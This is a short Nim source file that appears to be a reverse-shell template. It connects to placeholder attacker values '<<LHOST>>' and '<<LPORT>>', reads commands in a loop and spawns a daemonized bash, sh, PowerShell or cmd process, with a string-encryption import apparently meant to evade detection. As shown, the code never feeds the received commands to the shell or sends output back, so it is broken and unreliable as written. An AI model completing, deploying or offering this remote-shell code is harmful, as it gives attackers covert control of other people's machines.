import net, os, osproc, strutils
import strenc

proc get_os_shellbins(): seq =
    when defined linux:
        return @["/bin/zsh", "/bin/bash", "/bin/sh"]
    when defined windows:
        return @["powershell.exe", "cmd.exe"]

proc run_shellbin(): Process =
    for p in get_os_shellbins():
        try:
            return start_process(p, options={
                poStdErrToStdOut,
                poDaemon
            })
        except Exception as e:
            discard e

when isMainModule:
    let v = newSocket()

    try:
        v.connect("<<LHOST>>", Port(parseInt("<<LPORT>>")))

        while true:
            let c = v.recvLine().strip()

            if c == "exit":
                break

            let p = run_shellbin()

    except:
        raise
    finally:
        v.close()
